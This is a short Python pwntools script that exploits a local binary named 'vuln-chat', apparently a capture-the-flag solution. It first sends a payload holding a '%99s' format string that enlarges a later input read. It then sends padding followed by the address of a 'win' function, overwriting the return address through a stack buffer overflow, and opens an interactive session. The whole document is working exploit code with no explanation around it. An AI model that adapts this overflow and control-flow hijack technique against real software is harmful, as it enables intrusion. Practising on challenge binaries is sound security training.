#!/usr/bin/env python3

from pwn import *

context.binary = binary = ELF("./vuln-chat")

p = process("./vuln-chat")

# gdb.attach(p)

padding = b'a'*(0x14)
buffer_ext_size = b'%99s'

payload = padding + buffer_ext_size

p.recvline()
p.sendline(payload)

padding = b'a'*0x31
win = 0x0804856b

payload = padding + p32(win)

p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.sendline(payload)

p.interactive()
